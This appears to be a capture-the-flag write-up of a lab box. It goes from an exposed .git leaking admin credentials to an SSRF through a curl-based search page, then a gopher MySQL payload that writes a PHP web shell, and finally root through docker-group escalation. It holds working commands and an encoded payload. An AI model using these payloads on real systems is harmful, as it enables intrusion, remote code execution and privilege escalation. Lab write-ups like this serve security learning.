---
layout: post
author: kohaku
title:  "Exposed"
date:   2022-02-26 09:42:45 PM -03
category: Crowsec
---

# Enumeration

{% highlight text  %}
Nmap scan report for 10.8.0.37
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 79:8a:fd:d4:fd:8f:6b:86:1c:90:28:d0:8a:3b:5a:52 (RSA)
|   256 07:74:e9:b4:ac:87:85:17:ea:26:16:0f:8f:81:8e:98 (ECDSA)
|_  256 b3:ee:e8:98:47:42:c7:12:f1:29:1f:01:a5:13:41:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Login Administration
| http-methods:
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight  %}

## Port 80

The main page is a login page, i tried SQL injection, but nothing happen.

So, i start to fuzzing

### Fuzzing

{% highlight bash  %}
ffuf -u http://10.8.0.37/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt | tee fuzz.root
{% endhighlight  %}

{% highlight text  %}
.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10]
.git/index              [Status: 200, Size: 630, Words: 4, Lines: 8]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6]
.git                    [Status: 301, Size: 305, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10]
.git/logs/              [Status: 200, Size: 1128, Words: 77, Lines: 18]
assets                  [Status: 301, Size: 307, Words: 20, Lines: 10]
auth                    [Status: 301, Size: 305, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 2706, Words: 445, Lines: 138]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10]
{% endhighlight  %}

The website has a git exposed. I use gitdumper to extract the .git directory

### Git Exposed

{% highlight bash  %}
/opt/gitdumper.sh http://10.8.0.37/.git/ git
{% endhighlight  %}

Git log shows all the commits and i use git show with the hash of the commit to view the files 

{% highlight text  %}
-> git log
commit 83022d2e8bb833b8a1f2715e2134ec7399f1e181
-> git show 83022d2e8bb833b8a1f2715e2134ec7399f1e181
{% endhighlight  %}

This commit has a lot of files, but two files are interesting 

Login.php and search.php

{% highlight text  %}
Login.php has credentials to login
'user' => 'Crows3cAdminist4ti0n',
'password' => 'S3cr3tP@ss0rd_h4rd!*#9)';

Search.php has a command using curl and system
<?php
    $cmd = "curl ".escapeshellarg($_POST['search'])." |cat";
    system($cmd);
    die();
?> 
{% endhighlight  %}

### Search page

The page has a search page, like i saw on git logs

I use burp to intercept the request and start to test 

{% highlight text  %}
search=file:///etc/passwd -> Return the /etc/passwd file 
{% endhighlight  %}

I start to get a little confused about this script with curl, take me a while to use gopher and start to scan the ports

[What is Gopher? - Definition from Techopedia](https://www.techopedia.com/definition/5360/gopher)

I created a script to do a SSRF using gopher and scan the ports

{% highlight bash  %}
for port in {22,21,80,8080,3306}; do echo $port; curl -X POST http://10.8.0.37/search.php -d "search=gopher://localhost:$port/_TEST" -b "PHPSESSID=<Use the php cookie>"; done
{% endhighlight  %}

Looking at the response, i saw the mysql response the request. This host has a MySQL on the localhost

### Gopherus

https://github.com/tarunkant/Gopherus

I use gopherus to create a mysql payload

Note: Remember to double url encode the payload. Because the php do a urldecode and this can cause issues to the payload

{% highlight text  %}
gopherus --exploit mysql
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%56%00%00%00%03%73%65%6c%65%63%74%20%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%27%63%6d%64%27%5d%29%20%3f%3e%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%73%73%65%74%73%2f%72%65%76%65%72%73%65%2e%70%68%70%22%3b%01%00%00%00%01
{% endhighlight  %}

{% highlight bash  %}
payload -> select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/assets/cmd.php" #www-data only has access to assets
{% endhighlight  %}

Go to the /assets/<name>.php to access the RCE and create a reverse shell

## Root Flag

www-data is in docker group

`uid=33(www-data) gid=33(www-data) groups=33(www-data),117(docker)`

Using docker images, I saw the docker has no images and i search how to load a local image

- Step 1: Go to my machine and pull alpine image `docker pull alpine`
- Step 2: Export docker image: docker save -o <image.tar> <image> | docker save -o `alpine.tar` `alpine`
- Step 3: Transfer this .tar file to the victim machine
- Step 4: Load the docker image: docker load -i <image.tar> | docker load -i `alpine.tar`
- Step 5: Create a docker container using this image: docker run -it -v /root:/root alpine sh